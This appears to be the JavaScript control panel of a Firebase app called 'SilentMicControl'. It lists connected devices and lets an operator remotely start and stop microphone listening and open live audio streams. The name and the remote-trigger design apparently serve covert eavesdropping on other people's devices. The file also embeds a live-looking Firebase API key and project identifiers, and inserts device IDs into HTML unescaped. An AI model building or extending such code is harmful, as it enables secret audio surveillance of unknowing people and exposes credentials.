// ✅ Firebase config: SilentMicControl
const firebaseConfig = {
    apiKey: "AIzaSyBhGRecTTqVEKFiOHIWzalUDwneHTyceEc",
    authDomain: "silentmiccontrol.firebaseapp.com",
    databaseURL: "https://silentmiccontrol-default-rtdb.firebaseio.com",
    projectId: "silentmiccontrol",
    storageBucket: "silentmiccontrol.firebasestorage.app",
    messagingSenderId: "970778075127",
    appId: "1:970778075127:web:038be49993e1555ed418f2"
  };
  
  // Firebase SDK (modular v9+)
  import { initializeApp } from "https://www.gstatic.com/firebasejs/9.6.1/firebase-app.js";
  import { getDatabase, ref, onValue, set } from "https://www.gstatic.com/firebasejs/9.6.1/firebase-database.js";
  
  const app = initializeApp(firebaseConfig);
  const db = getDatabase(app);
  const deviceList = document.getElementById("deviceList");
  
  const devicesRef = ref(db, "live_audio");
  onValue(devicesRef, (snapshot) => {
    deviceList.innerHTML = "";
  
    if (!snapshot.exists()) {
      deviceList.innerHTML = "<p>No devices connected.</p>";
      return;
    }
  
    const devices = snapshot.val();
    Object.keys(devices).forEach((deviceId) => {
      const div = document.createElement("div");
      div.className = "device";
      div.innerHTML = `
        <strong>Device ID:</strong> ${deviceId}<br/>
        <button class="start">Start Listening</button>
        <button class="stop">Stop</button>
        <button class="listen">Open Stream</button>
      `;
  
      const [startBtn, stopBtn, listenBtn] = div.querySelectorAll("button");
  
      startBtn.onclick = () => {
        set(ref(db, `live_audio/${deviceId}/command`), "start");
      };
  
      stopBtn.onclick = () => {
        set(ref(db, `live_audio/${deviceId}/command`), "stop");
      };
  
      listenBtn.onclick = () => {
        window.open(`stream.html?device=${deviceId}`, "_blank");
      };
  
      deviceList.appendChild(div);
    });
  });